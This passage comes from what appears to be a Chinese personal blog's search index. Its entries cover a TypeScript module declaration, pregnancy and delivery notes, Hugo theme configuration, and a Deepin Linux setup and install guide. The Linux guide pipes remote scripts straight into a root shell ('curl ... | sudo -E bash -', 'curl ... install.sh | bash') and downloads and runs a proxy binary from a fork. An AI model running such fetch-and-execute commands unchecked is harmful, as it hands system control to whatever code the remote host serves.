模块\u0026quot;@lianpf/native-sdk-plus\u0026quot;没有导出的成员“ZNavigator”。ts(2305)\n原因：\n原因是@lianpf/native-sdk-plus内部为js库，那么要如何配置，可以忽略这些ts错误提示呢\n解决办法：\ntsconfig.json\n{ \u0026#34;extends\u0026#34;:\u0026#34;./src/.zmi/tsconfig.json\u0026#34;, \u0026#34;compilerOptions\u0026#34;: { \u0026#34;allowJs\u0026#34;: true, \u0026#34;checkJs\u0026#34;: false, // 其他编译选项 \u0026#34;typeRoots\u0026#34;: [\u0026#34;src/@types/native-sdk-plus.d.ts\u0026#34;], } } src/@types/native-sdk-plus.d.ts\ndeclare module \u0026#39;@zto/zt-sdk-plus\u0026#39; { // 库的导出类型和函数声明 // ... 其他类型和函数声明 // const lib: { // // 允许任意方法名，但这不是一个好的做法，因为它会失去类型安全性 // [methodName: string]: (...args: any[]) =\u0026gt; any; // }; // export = lib; export const ZNavigator: any; } 参考 \u0026hellip; 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/ts-codefragment/","summary":"\u003cp\u003e摘要\u0026hellip;\u003c/p\u003e","title":"常见问题\u0026代码片段: TS"},{"content":"初为人父，是一段令人欣喜但也容易不做所错的阶段。这里记录了一些，在孕期中对于媳妇儿和宝宝相关的注意事项。\n本文【孕期系列】的最后1篇 《孕期: 住院陪护攻略和分娩》，本系列其他文章：\n第1篇 《孕期: 背景知识和胎教》 一、住院陪护攻略 1.孕晚期篇 孕28周-分娩前: 督促妈妈完成数胎动回家作业 孕34周-37周前：整理【熟悉】待产包和住院陪床物品 特别提醒：\n请核对文件类：如身份证复印件（正反面在一页）等 二类消毒物品规范使用：请不要携带有安全隐患的物品（食品和物品安全） 提前规划来院交通，破水请打120（告知120去长妇幼） 熟悉产后办理相关事宜（出生证明等） 方式1：长妇幼微信公众号 -\u0026gt; 微自助 -\u0026gt; 住院服务 -\u0026gt; 出生一件事 方式2：随申办 -\u0026gt; 出生一件事 -\u0026gt; 微视频 注意：需查询【网络流程】和【现场办理要求】。一旦线下办理了【出生证明】，则剩下的流程需要全部走线下流程。 2.入院篇 2.1 常规入院 注意：住院期间所有纸质版资料请统一放入文件袋中，避免重要资料遗失：如住院押金单\n医生开入院单：交【入院处】（2号楼住院部），等待电话办理入院。特需交特需吧台，走特需流程，等待电话办理入院。 待产室和产房固定家属1位，各类病区陪护1位，非必要不换人 办理住院手续时，可登记床位需求 2.2 急诊入院 医院急诊地址：愚园路786号（特需和普通均是）。就在医院门诊隔壁，全年全天24小时开诊。\n把握急诊来院指征 —— 参考 《孕晚期保健课》课件 选择合适交通工具来院，带好入院各类物品 破水请打120，告知120工作人员要去的分娩医院（长妇幼）。怎样区分胎膜早破，参考 孕晚期课件 符合住院标准：办理住院手续，入住待产室（自然分娩准爸爸全程陪同，剖腹产家属指定区域等候）。 3.产时篇 注意：医院禁止拍照、摄像和录音。自拍时，请勿影响和拍摄其他人（工作人员和其他孕产妇家属）\n入室准备： 口罩、帽子、鞋套、家属内穿衣（医院提供） 入室均需手消毒 胎盘处置： 自留：容易变质，及时送出 医院处理：按照废弃医疗器械处理 必须医院处理：病变类型或需切片检查类型 4.产后篇 4.1 准爸爸整理物品须知 注意贵重物品的保管\n床头柜：放置常用物品（水杯、纸巾等） 婴儿床下：尿布、湿纸巾、卫生巾、马桶垫等 壁橱：可放置贵重物品和其余物品，【及时上锁】 妥善保管：陪客证和医院门禁卡 首次去护士吧台办理登记手续：携带手机、夫妻双方身份证、陪客证备用 4.2 准爸爸填写信息须知（新生儿疾病筛查） 所有信息准确无误的填写 新生儿疾病筛查，需二维码填写（产后病房发放） 新生儿疾病筛查报告\n异常报告：儿童医院新生儿疾病筛查中心，短信通知 正常报告：自助查询 4.3 准爸爸安全陪护须知 防烫伤、防跌倒和防坠床 拖鞋要注意防滑（不要穿酒店那种一次性拖鞋），需要时拉起床栏 不要在婴儿床上方，传递任何物品（如：热粥） 妈妈如厕时，要注意陪伴，首次如厕请呼叫护士。 不拆除取消 孩子的防盗铃、腕带，吊牌丢失及时告知护士。 注意宝宝床栏： 5.出院篇 5.1 出院手续和母婴手册 5.2 出生医学证明 注意：\n需查询【网络流程】和【现场办理要求】。一旦线下办理了【出生证明】，则剩下的流程需要全部走线下流程。 【宝宝名字】一定要多次确认，一经打印，医院不可更改和替换 6.产后办理相关事宜 出生医学证明 婴儿户口申报 少儿医保卡 生育保险待遇申领 注意：是否可以【网络办理】，需要查询支持的条件\n上海公安人口管理官方 shgarkb\n二、分娩 1.分娩准备 临近分娩: 做好入院准备，准父母一起学习临产知识 注意继续做好自我监护，数胎动 孕晚期: 控制体重，一周增加小于500克。练好体力，练好呼吸 分娩的相关因素： 2.产程 胎儿娩出产道的过程: 第一产程: 临产到宫口开全 第二产程: 宫口开全到胎儿娩出 第三产程: 胎儿娩出后到胎盘胎膜娩出 2.1 第一产程 第一产程又称为宫颈扩张期。从开始出现宫缩临产直至宫口开全（10厘米）为止。\n第一产程可分为两个阶段：潜伏期和活跃期。\n准妈妈该怎么做?\n保持精神愉悦和放松，正确呼吸很重要！ 产程中多进食半流质食物，多进水（准备 弯头吸管）。 多活动，勤排尿，利用体位加速产程。克服焦虑、恐惧，采用多种放松方法。 产时饮食指导：\n建议准备的饮料：电解质饮料，运动型饮料，橙汁（常温保存） 建议准备的食物：可常温保存的蛋糕面包等软食（快速补充糖分和能量），可热水冲泡的芝麻糊、藕粉和豆奶粉等，软糯容消化的香蕉水果等 不建议准备: 红牛，巧克力，人参（粉），桂圆，红糖，奶茶等 2.2 第二产程 第二产程，又称胎儿娩出期。从宫口开全到胎儿娩出的全过程。初产妇需要3-4小时，经产妇2-3小时完成。\n整个过程伴随：子宫收缩增强、胎儿下降及娩出、疼痛与排便感\n准妈妈该怎么做？\n合适体位。 控制好呼吸，正确屏气。 陪产人员注意全程鼓励（正能量） 准爸爸，您该怎么做？ 给予准妈妈精神和情感上的支持 提醒准妈妈放轻松，调整好呼吸 帮助她按摩背部、擦汗、喂水 要多说些鼓励和赞扬的话，让准妈妈有信心坚持到底 友情提示：请继续督促妈妈完成数胎动的回家作业 2.3 第三产程 第三产程 又称胎盘娩出期。从胎儿娩出后到胎盘胎膜娩出，即胎盘剥离和娩出的全过程，需要5-10分钟，一般不超过30分钟。\n早吸吮，早接触，早开奶 会阴侧切（指征） 产后观察2小时，生命体征监测 3.分娩镇痛攻略 产妇需求、产房医生、麻醉师、助产士：\n签署“分娩镇痛知情同意书” 宫口开大2~3cm时常规行阴道检查 产程进展理想，无麻醉禁忌症 持续监测胎心直至胎儿娩出 4.预防“艾梅乙”母婴传播 乙肝病毒感染、梅毒感染和HIV感染等，具体咨询临床医生遵医嘱。 乙肝病毒携带者：婴儿出生后，接种乙肝疫苗、乙肝免疫球蛋白（24小时） 注意：此笔记仅供作者自身记录使用，专业性问题请联系专业的妇幼医生，请勿商用！版权相关及课程授权，请联系【上海市长宁妇幼保健院】！\n最后， 希望各位准爸爸们，一定要优先照顾好准妈妈，她冒着巨大的风险带着你们的宝宝来到这个世界！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/other/pregnancy-accompany-and-childbirth/","summary":"初为人父，是一段令人欣喜但也容易不做所错的阶段。这里记录了一","title":"孕期: 住院陪护攻略和分娩"},{"content":"初为人父，是一段令人欣喜但也容易不做所错的阶段。这里这里记录了一些，在孕期中对于媳妇儿和宝宝相关的注意事项\u0026hellip;\n本文是【孕期系列】的第1篇 《孕期: 对于准妈妈和宝宝的注意事项》，本系列其他文章：\n最后1篇 《孕期: 住院陪护攻略和分娩》 一、背景 1.孕期（宝宝发育过程） 孕早期（宝宝成型期）：周数是1~12周（月份数是1-3月） 从排卵到精子卵子结合，再到胚胎发育成宝宝。宝宝器官和外貌基本形成，已初具人形 孕中期（宝宝成长期-宝宝发育要点）：周数是13~25周（月份数是4-6.5月） 宝宝大脑、骨骼、内脏等器官组织进一步发育，宝宝迅速成长 孕晚期（宝宝发育期）：周数是26~40周（月份数是6.5-10月） 宝宝将完善各器官，比如皮肤长得更厚实了，皮下脂肪逐渐增加;宝宝呼吸系统更加健全，大脑神经系统不断完善。各器官也会具有其相对应的功能，为出生后做好充分准备 足月: 妊娠38～42周内分娩 1.1 孕早期 3周+3（24天）：心脏开始跳动 5周：9毫米长，面部发育隐约可见鼻子和嘴 5周+5（40天）: 胎盘和胚胎，被脐带连接 6周：可看到宝宝的脊 7周：隐约可见宝宝人形 8周：在胎囊中，快速发育 1.2 孕中期 16周: 宝宝生殖器官已形成 17周：宝宝眼皮已形成。但紧闭着，直到24周才会睁开 20周：宝宝长约20cm。学会吮吸，开始能吞咽羊水 24周：听力已经形成，有细微表情 1.3 孕后期 26周: 小家伙蜷曲在子宫里，这个空间显得有点儿小了 36周: 全身器官功能完善，宝宝越来越胖 37周：胎脂减少，胎头下降 2.宝宝的变化（脑、听/视/触/味觉） 宝宝脑的变化\n2-3月：神经管鼓起，大脑迅速发育。脑和延髓分明 4-5月：神经元增多，神经突出形成。表皮未褶皱 6-7月：脑c分化，接近成人脑构造 8-9月：脑发育完成，褶皱基本形成 10月：脑重量400g，神经c 1000亿 宝宝听觉: 依赖母亲的心音\n4周：听觉器官已经发育 25周：传音系统基本发育完成 28周：可以发生听觉反应 宝宝视觉: 17周（4个月），开始对光线就非常敏感\n宝宝触觉\n宝宝触觉出现很早，由于子宫黑暗，所以宝宝的触觉和听觉非常发达 妊娠2个月：宝宝就能扭动头部、四肢和身体 宝宝味觉: 味蕾在妊娠3个月时逐步形成，7个月已大致完成，对甜味和苦味敏感\n二、认识胎教（构筑宝宝聪明头脑） 准妈妈的调整:\n环境胎教 营养胎教 适当运动 情绪胎教: 愉快的心情 家人的关爱 展望美好未来 1.环境胎教 居家环境 新居装修完毕，建议半年后入住（做有害物质检测） 新购置的儿童衣物玩具的橱柜，材质选择无毒，且容易清洗的材质，做好通风，让有害物质充分挥发 室内不建议使用纯毛地毯（如果使用请及时消毒，并通风） 二手烟：孕期减少被动吸烟的机会 注意卫生：避免给猫狗吃生肉，避免直接接触猫狗的粪便（孕期最好不要接触猫狗） 二手烟，对孕妇和宝宝有哪些危害呢？\n对孕妇的危害 妊娠综合症：高血压、高血糖等 孕期致癌：基因突变，导致肿瘤发生 抵抗力下降：更易感冒、头痛 对宝宝的影响 宝宝发育不良，宝宝畸形，甚至是死胎 婴儿猝死综合症、早产、新生儿神经管畸形和唇腭裂等风险上升 2.情绪胎教：保持愉悦的心情 情绪胎教：宝宝两三个月就可以感受到妈妈的情绪，会影响到神经系统发育结构和改变DNA糖皮质激素受体结构，所以准妈妈一定要心情愉悦，重视产检常规心理门诊（早发现，早干预） 宝宝能理解妈妈的感情：当母亲情绪变化时，神经系统分泌的激素会随血液经胎盘进入宝宝体内，使宝宝产生与准妈妈一样的情绪特征 妈妈惊慌失措，宝宝会全身抽搐 妈妈闷闷不乐时，平时活跃的宝宝也不动了 如何保持愉悦的心情？\n做自己喜欢做的事情 看喜剧电影和幽默画报（不建议孕妇前往电影院和KTV环境） 准爸爸要体贴 常找朋友倾诉 记日记或写博客 常做放松训练 逃离纷扰的都市 3.如何正确的胎教？ 胎教始于优孕\n以宝宝为中心安排生活 胎教的关键是 准妈妈的情绪和态度 为胎教创造好的环境 准爸爸是参与胎教不可缺少的环节 “子宫对话”：多和宝宝沟通；充满感情色彩的给宝宝讲故事 给宝宝以音乐的熏陶 每次胎教前，练习一下【呼吸法】平静心情 呼吸法: 自我放松训练（练习时，着宽松运动型衣物）\n采取舒适、自然的方式坐在椅子上或躺在床上 腰背舒展，全身放松，微闭眼睛，缓慢深呼吸 注意：此笔记仅供作者自身记录使用，专业性问题请联系专业的妇幼医生，请勿商用！版权相关及课程授权，请联系【上海市长宁妇幼保健院】！\n最后， 希望各位准爸爸们，一定要优先照顾好准妈妈，她冒着巨大的风险带着你们的宝宝来到这个世界！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/other/pregnancy-attention/","summary":"\u003cp\u003e初为人父，是一段令人欣喜但也容易不做所错的阶段。这里这里记录了一些，在孕期中对于媳妇儿和宝宝相关的注意事项\u0026hellip;\u003c/p\u003e","title":"孕期: 背景知识和胎教"},{"content":"Hugo博客中的官方导航栏是头部的，之前使用的Mainroad主题也是如此（且不太好自定义到左侧）。日常文档阅读中，侧边toc更为方便，故对主题做了升级\u0026hellip;\n一、Papermod 主题配置 官方主题仓库: https://github.com/adityatelange/hugo-PaperMod 项目初始化：\n$ cd Blogs # 进入博客项目 $ git submodule update --init # 拉取themes/hugo-PaperMod/下的子模块，里面放的是官方主题 修改config.yml核心配置:\n... theme: hugo-PaperMod # 主题名字，和themes文件夹下的一致 ... menu: main: - identifier: search name: 🔍 搜索 url: search weight: 1 - identifier: home name: 🏠 主页 url: / weight: 2 - identifier: tags name: 🧩 标签 url: tags weight: 15 - identifier: archives name: ⏱️ 归档 url: archives/ weight: 3 - identifier: about name: 🙋🏻‍♂️ 关于 url: about weight: 50 outputs: home: - HTML - RSS - JSON # 这里的参数会被代码以 .Site.Params 的形式读取 params: ... defaultTheme: dark # defaultTheme: light or dark or auto disableThemeToggle: false DateFormat: \u0026#34;2006-01-02\u0026#34; ... profileMode: ... subtitle: 🌝 带着 \u0026#34;偏见\u0026#34; 去理解技术的世界 imageUrl: \u0026#34;img-common/avatar.jpeg\u0026#34; ... buttons: - name: 📕 计算机基础 url: posts/computer-basics - name: 👨🏻‍💻 前端开发 url: posts/frontend-develop - name: 🧱 后端开发 url: posts/backend-develop - name: 🏖 其他 url: posts/other socialIcons: - name: github url: \u0026#34;https://github.com/lianpf\u0026#34; - name: 知乎 # url: \u0026#34;zhihu.svg\u0026#34; url: \u0026#34;https://www.zhihu.com/people/lianpf-sun/posts\u0026#34; - name: email url: \u0026#34;mailto:wanderlian@outlook.com\u0026#34; - name: RSS url: \u0026#34;index.xml\u0026#34; ... StartYear: 2016 # 底部开始年份 ... 更多个人信息配置，请参考建站教程：https://www.sulvblog.cn/posts/blog/\n在终端输入hugo server -D，在浏览器输入：localhost:1313 即可看到\n二、注意事项 1.Papermod主题下博客不生效? 原Mainroad主题下的博客，在切换到Papermod时，突然失效。经排查，发现Papermod官方示例仓库下的post分类增加了_index.html文件，不增加则无法正常访问。\n如：/Blogs/content/posts/other分类下直接写文，现在则需要增加/Blogs/content/posts/other/_index.md，示例如下:\n--- title: \u0026#34;📚 其他\u0026#34; # description: \u0026#34;一些无法分类的知识\u0026#34; hidemeta: true # 是否隐藏文章的元信息，如发布日期、作者等 --- 2.GitHub Actions中Hugo版本过低 PaperMod主题要求：Hugo \u0026gt;= v0.112.4 $ hugo version # 查看版本 $ brew update # Mac终端中更新 Homebrew $ brew upgrade hugo # 升级 hugo /Blogs/.github/workflows/deploy.yml配置项升级Hugo版本：\n... jobs: deploy: ... steps: ... - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;0.112.4\u0026#39; # 升级hugo版本为0.112.4 或 latest extended: true ... 3.主页socialIcons配置问题 目前主题官方只能支持预设的一些icon，详情参考: hugo-PaperMod / Icons\n用法如下：\nsocialIcons: - name: \u0026#34;x\u0026#34; url: \u0026#34;https://x.com\u0026#34; - name: \u0026#34;other\u0026#34; # 自定的icons url: \u0026#34;https://xxx.xxx\u0026#34; 参考 根据Hugo PaperMod主题自定义的各种逻辑: xyming108/sulv-hugo-papermod Sulv hugo博客搭建 | PaperMod主题 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/tools-docs-hugo-papermod/","summary":"\u003cp\u003e\u003ccode\u003eHugo\u003c/code\u003e博客中的官方导航栏是头部的，之前使用的\u003ccode\u003eMainroad\u003c/code\u003e主题也是如此（且不太好自定义到左侧）。日常文档阅读中，侧边\u003ccode\u003etoc\u003c/code\u003e更为方便，故对主题做了升级\u0026hellip;\u003c/p\u003e","title":"工具: Hugo博客的 Papermod 主题"},{"content":"在上一篇 Linux: 基于Windows，安装Deepin（深度）双系统中，成功安装Deepin系统。那么为了方便后续的使用，需要更新系统，安装应用程序和环境配置。\n目前主流的 Linux 版本： Debian（及其派生版本Ubuntu、Linux Mint、deepin - 开源国产操作系统） Fedora（及其相关版本Red Hat Enterprise Linux、CentOS） openSUSE 本文是基于Debian（deepin 20.9）为例，从系统、应用程序、环境配置等几个视角进行说明\u0026hellip;\n一、更新系统\u0026amp;内核 1.内核相关 1.1 升级内核版本 安装源内的内核 注意：这里headers和image两个文件要替换为要安装的对象，可从终端列表复制，中间空格隔开\n注意：如果正式版源里，没有你想要的最新内核，那就先添加内测通道再来安装内核。装完内核后，如果不想用内测版就要及时将内测源关掉，否则再下次更新时有可能出现影响使用的bug。\n$ sudo apt search linux-image-* # 查看源内的内核有哪些 # 如果在【添加完内测源】后，发现内核数量还没增加就执行 $ sudo apt-get update 更新一下源的信息后，再查看一下源内的内核 # 安装：格式为 # sudo apt update \u0026amp;\u0026amp; sudo apt install linux-image- linux-headers- # 例子1：内核无后缀的安装 $ sudo apt update \u0026amp;\u0026amp; sudo apt install linux-image-6.2.1 linux-headers-6.2.1 # 例子2：内核有后缀的安装 $ sudo apt install linux-image-5.18.17-amd64-desktop-hwe linux-headers-5.18.17-amd64-desktop-hwe # 重启。查看内核版本是否安装成功 - 默认使用最新版本内核 $ uname -r # 或 uname -a 1.2 卸载内核 注意：这里headers和image两个文件要替换为要卸载的对象，可从终端列表复制，中间空格隔开\n# 展示所有安装的内核 $ dpkg --get-selections| grep linux # 或 dpkg -l | grep \u0026#34;linux-image\\|linux-headers\u0026#34; # 选择不要的进行卸载 # 卸载的格式：sudo apt purge linux-image- linux-headers- # 例子1: 内核有后缀的卸载 $ sudo apt purge linux-image-5.18.4-amd64-desktop-hwe linux-headers-5.18.4-amd64-desktop-hwe # 例子2: 内核无后缀的卸载： $ sudo apt purge linux-image-6.1.12 linux-headers-6.1.12 1.3 kernel官网: 自行编译内核 注意：以下是 内核官网 下载升级的教程，常规下不太建议使用，主要适用于以上其他手段获取的内核无法解决问题时。详细文档可参考：Linux: 编译内核教程（全）(Ubuntu)(Deepin)(Debian)\ni. 更新软件源\u0026amp;软件\n$ sudo apt update # 更新软件源 $ sudo apt upgrade # 更新软件 ii.内核官网 下载内核源代码，选择stable旁边的tarball下载。\niii. 安装依赖\n$ sudo apt install libncurses5-dev openssl libssl-dev build-essential pkg-config libc6-dev bison flex libelf-dev zlibc minizip libidn11-dev libidn11 qttools5-dev liblz4-tool # deepin用户，还要安装如下的依赖 $ sudo apt install plymouth* console-setup iv.编译\n# 解压 $ tar -xavf linux-5.18.14.tar.xz # 到你下载的目录解压，可解压在主目录（~）下，有教程说必须解压在/usr/src下，其实是无稽之谈，安装内核时系统会自动帮你把源代码复制到/usr/src下 $ cd linux-5.18.14 # 净化内核源码，删除残留 $ make mrproper # 可在想重新编译时执行这个命令 # 配置内核 # 1.新版本内核源码中自带的.config文件所含内容太少，编译后只能加载一个模块，不能满足正常使用 # 2. 选择官方系统编译好的内核（版本末尾包含-amd64-desktop的内核）的.config配置文件，复制过来。(当前官方最新内核是5.15.34，在第二行代码/boot/config后面双击tab键列出文件名参考补全) $ sudo su $ cp /boot/config-5.15.34-amd64-desktop .config # 复制完成后，输入exit退出sudo，再继续编译。在sudo下编译内核，会有一堆问题 v.编译并安装内核（编译内核需要的时间很长）\n# 编译主体 $ make bzImage -j6 # 6是你电脑CPU的线程数，自行查询 # 编译模块 $ make modules -j6 # 安装模块 $ sudo make INSTALL_MOD_STRIP=1 modules_install -j6 # 编译阶段取消调试信息（在Kernel hacking的目录下取消Kernel debugging）或复制的官方系统内核的.config文件，此处命令就可删掉INSTALL_MOD_STRIP=1参数 # 安装后，/lib/modules下会出现内核版本号文件夹 # 最后三部曲，内核最终文件 $ sudo mkinitramfs /lib/modules/5.18.14-amd64-desktop/ -o /boot/initrd.img-5.18.14-amd64-desktop $ sudo cp arch/x86/boot/bzImage /boot/vmlinuz-5.18.14-amd64-desktop $ sudo cp System.map /boot/System.map-5.18.14-amd64-desktop # 更新grub $ sudo update-grub2 vi.重启且查看版本号\n$ uname -r # 查看内核版本是否正确 2. 前端软件包管理器apt和apt-get 因为 Deepin 20.9社区版是基于Debian系统的，所以对软件包管理器的使用直接参考Deepin系统即可。 \u0026ldquo;前端软件包管理器\u0026quot;的概念，可以对标 Mac 中的 Homebrew\napt-get和apt：使用命令和差异\n$ dpkg -l | grep \u0026lt;package_name\u0026gt; # 查找通过 apt install 安裝的package版本 $ sudo apt remove \u0026lt;package_name\u0026gt; # 移除该包 二、环境配置 1. git \u0026amp; ssh-key $ sudo apt intall git # 安装git $ git --version git ssh 设置: 参考Git 中 ssh key、https 配置及用户名、邮箱基本信息配置- Blogs\n2. node相关: npm、版本管理 参考: 如何在 Debian 10 上安装 Node.js\n方式1：默认存储库中的 Apt 安装\n# 注意，不会安装最新版本 $ sudo apt install nodejs npm -y # 只能升级到旧版本 $ node -v # 验证 10.x.x 方式2: 使用 NodeSource ，通过 Apt 安装\n$ sudo apt remove nodejs npm # 卸载旧版本 $ curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash - # 官网查找对应的lts版本 $ sudo apt install -y nodejs $ node -v 方式3: 使用 nvm 管理 node 多版本 【推荐】 注意: nvm管理的多版本node，互相独立（包括node_modules）\n$ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash # 将 nvm 脚本安装到的用户帐户 $ source ~/.bashrc # 刷新 $ nvm list-remote # 列出可用版本 $ nvm install 20.11.1 # 安装: 查看官网获取lts版本 $ nvm use 11.6 $ nvm alias default 11.7 # 设置默认版本 三、常用软件 1.科学上网: shadowsocks \u0026amp; clash Adblock Plus Filters自定义规则 介绍了使用配置项，配置shadowsocks和v2ray等SSR工具的自定义规则。虽然可以解决问题，但仍比较繁琐。下面介绍如何通过GUI解决这个问题。\n1.1 shadowsocks 安装 shadowsocks跨端版本 electron-ssr-0.2.6.deb （阿里云盘）\n可能出现问题：ssr配置完订阅，升级服务后，切换到PAC，仍然不能正常访问 解决思路: 打开全局代理，重新切回PAC代理即可\n1.2 clash 方式1：clash命令行版本配合web ui教程 参考：kingfast使用教程\n方式1-i: 启动 clash core 注意：linux一般下载clash-linux-amd64-xxx\n# 第1步：下载Clash Core 二进制可执行文件 # 下载地址: https://github.com/doreamon-design/clash/releases # 已fork到: https://github.com/lianpf/clash # 第2步：解压 \u0026amp; 赋予执行权限 $ cd /home/lianpf/software/clash # 进入软件的安装目录 $ wget -c https://github.com/doreamon-design/clash/releases/download/v2.0.24/clash_2.0.24_linux_amd64.tar.gz # 下载失败，则手动去GitHub下载 $ tar -zxvf clash_2.0.24_linux_amd64.tar.gz # 解压缩文件 $ cd .. $ chmod +x clash # 赋予执行权限 # 第3步：从订阅地址获取config.yaml $ mkdir -p ~/.config/clash $ wget -O ~/.config/clash/config.yaml https://sub.o4o.win/xxx?type=clash # 替换成你自己的clash订阅链接 # 第4步：启动 $ cd ~/.config/clash $ ./clash # 在你clash的安装目录下执行命令启动。 # 运行Clash 会默认读取 $HOME/.config/clash 目录下的 config.yaml 文件 若运行提示端口被占用，则参考 Linux基础命令（Cloud Notes） 杀掉占用进程\n运行clash报错如下：INFO[0000] Start initial compatible provider Ⓜ 微软服务 ... ERRO[0000] External controller listen error: listen tcp :9090: bind: address already in use WARN[0000] [CacheFile] can\u0026#39;t open cache file: timeout ERRO[0000] create addr :7890 tcp listener error: listen tcp :7890: bind: address already in use ERRO[0000] create addr :7891 tcp listener error: listen tcp :7891: bind: address already in use 方式1-ii: Web GUI（SwitchyOmega扩展）管理 可看到上一步，clash创建前置代理，http代理端口为：7890 ，socks5代理端口为：7891 ，RESTful API的端口是9090 (实际端口，以./clash执行后，终端输出的为准)\nChrome商店安装扩展，或点击 https://github.com/FelisCatus/SwitchyOmega/releases 下载\n注意: 假如你使用代理客户端（linux内使用clash-windows），通常它可帮你合并端口。比如把以上的http、sockets等端口都设置为7890，那么你在【计算机系统 / 网络配置】里配置代理，和以下的端口配置中都可将所有端口设置为7890\n浏览器打开：https://clash.razord.top/#/connections，进行配置： 方式2：clash for windows 资源下载地址：https://archive.org/\n参考：manjaro-env-config/#科学上网\n第1步：下载安装\u0026amp;启动测试 clash for windows在linux也能用。不过clash作者删库跑路了，所以无法通过github下载或使用apt安装，只能找互联网残存版本安装。下载地址 或安装【阿里云盘】版本\narchive.org 下载linux 64位版本 第2步: 启动测试 \u0026amp; 桌面快捷方式 软件安装目录内解压 \u0026amp; 启动测试\n$ cd ~/software/clash-windows $ tar -zxvf your_file.tar.gz # 解压你的文件到当前目录 $ cp clash-windows/* clash-windows # 路径自行拼接：核心诉求就是把clash-windows解压后的所有内容，复制到clash-windows下 $ cd clash-windows # 进入software安装目录下 $ $ chmod +x /home/lianpf/software/clash-windows/cfw # 添加权限 (若无法启动cfw，则执行该步骤) $ ./cfw # 启动clash 启动成功页面：\n终端显示：\n弹出clash GUI：\n切换代理设置页面：\n到此为止，clash已经安装成功。如果不需要配置【桌面快捷方式】，可跳过以下步骤，直接参考【系统代理】配置\n创建桌面快捷方式（选择cfw文件发送到桌面）\n第3步: 系统代理 最后再打开系统设置，设置代理为clash端口，代理就倒腾完了 启动器/控制中心/网络/系统代理 9.其他：浏览器、热点 浏览器: https://www.google.com/chrome/dr/download/ 下载*.deb版本 Linux热点：https://github.com/lakinduakash/linux-wifi-hotspot 截图软件：推荐flameshot(火焰截图) manjaro-env-config/#截图工具 九、常见问题 1. Deepin系统快捷键有哪些？ 参考 工具: 快捷键（Shortcut keys） | Blogs\n2. 常见的终端命令 参考 Linux 基础命令 | CloudNotes\n3. 社区20.9版本系统，不兼容inter 12代集成显卡，导致扩展显示器不可用 问题描述： 清华镜像源安装的20.9社区版，内核是5.15.77版本，不兼容inter 12代集成显卡，导致电脑在连接到显示器时，无法检测到显示器\n解决办法： 升级内核至6.7.4版本。文件资源在【/阿里云盘/计算机系统/linux 6.7.4内核】，包括 linux-headers-xxx.deb 和 linux-image-xxx.deb 两个包:\n首先点击安装linux-headers-xxx.deb包，该包含内核头文件，用于构建和安装内核模块。 然后安装linux-image-xxx.deb包，该包含了实际的内核镜像。 注意：\n确保linux-image-xxx.deb和linux-headers-xxx.deb两个包，对应的版本号一致相匹配，以避免不兼容或产生其他问题 通常情况下，两个包的安装最好还是按照【先headers后image】的顺序进行安装，以确保系统能够正确识别和使用新的内核版本 直接手动点击这两个deb包，如果有依赖关系存在（比如linux-image-xxx.deb依赖于linux-headers-xxx.deb），包管理器会自动处理这些依赖关系，多数情况下会成功地安装内核头文件和内核镜像。 无论是通过命令行还是手动点击执行，要确保安装过程中没有出现错误，并且新的内核能够正确地被系统识别和启用。 方式2：通过命令行安装包 首先使用dpkg命令安装linux-headers-xxx.deb，然后再安装linux-image-xxx.deb\n# 在执行命令时，请将xxx替换为实际的版本号。安装完成后，系统会自动选择新的内核作为默认内核 sudo dpkg -i linux-headers-xxx.deb sudo dpkg -i linux-image-xxx.deb 参考 友情链接：manjaro环境配置 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/deepin-env-config/","summary":"\u003cp\u003e在上一篇 \u003ca href=\"/posts/computer-basics/deepin-env-config/\"\u003eLinux: 基于Windows，安装Deepin（深度）双系统\u003c/a\u003e中，成功安装\u003ccode\u003eDeepin\u003c/code\u003e系统。那么为了方便后续的使用，需要更新系统，安装应用程序和环境配置。\u003c/p\u003e","title":"Linux: Deepin系统环境配置"},{"content":"因为Linux的桌面发行版比较多，个人更加倾向于Debian系统，曾经折腾过deepin国产操作系统，所以此次仍然选择了deepin。本文主要介绍的是基于Windows系统上，安装Deepin系统社区20.9版本的整个过程\u0026hellip;\n基本流程 在Windows 10系统上安装deepin深度系统，分为以下几个步骤:\n制作系统安装U盘 设置电脑【BIOS自启动】 重启安装 但有些注意事项如下:\n1.制作 系统安装U盘启动盘 可直接使用【金士顿 32G】U盘，其是已做好的【启动盘】\n注意事项:\ni. 在清华大学开源镜像站 下载【镜像文件】，稳定性和速度都好很多 因为下载镜像的问题，可能会导致在【u盘启动盘】制作时，出现如下情况: ii. deepin官网依次打开 下载和帮助 -\u0026gt; 安装指南，对于步骤【三、安装前准备 / 2、制作过程】需注意:\n在【要安装deepin系统的Windows设备上】，下载对应系统版本的镜像文件\n双击运行【deepin-boot-maker.exe】程序（该exe程序，是通过点击xxx.iso镜像文件产生的） 在插入U盘时，制作U盘启动盘的 （选择 上一步Windows设备中 下载的deepin ISO镜像文件）\n注意: U盘此时是空盘，本身不存储任何IOS镜像相关文件，只是作为 下一步所生成的【系统安装U盘启动盘】 的存储设备 选择分区为 U盘空间（此处为H盘） 点击 开始制作，等待完成 2.设置电脑 BIOS自启动 以惠普为例:\ni. 进入BIOS: 开机过程中，疯狂按 Fn + F10 (若不成功，则尝试，同时按住 ESC键) ii. 设置语言: Advance -\u0026gt; Display Language -\u0026gt; 简体中文 iii. BIOS的第一启动项改成U盘 先进 -\u0026gt; 启动选项 -\u0026gt; 回车进入: 